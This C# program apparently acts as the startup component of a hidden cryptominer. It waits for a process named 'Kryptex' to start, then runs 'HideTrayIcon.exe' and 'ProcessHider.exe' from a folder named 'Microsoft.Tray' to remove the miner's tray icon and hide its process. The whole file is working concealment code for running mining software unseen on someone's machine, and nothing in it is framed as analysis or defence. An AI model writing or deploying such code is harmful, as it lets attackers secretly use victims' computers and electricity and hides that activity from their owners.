using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Startup
{
    internal class Program
    {
        private const string PROGRAM_PATH = "C:\\Program Files\\Microsoft.Tray";
        static void Main(string[] args)
        {
            while (true)
            {
                Process[] process = Process.GetProcessesByName("Kryptex");
                if (process.Length != 0)
                    break;
            }

            Thread.Sleep(10000);

            for (int i = 0; i <= 15; i++)
            {
                Thread.Sleep(350);
                Process.Start(Path.Combine(PROGRAM_PATH, "HideTrayIcon.exe"));
            }

            var processInfo = new ProcessStartInfo(Path.Combine(PROGRAM_PATH, "ProcessHider.exe"), "-n \"Kryptex\"")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };

            Process.Start(processInfo);
        }
    }
}
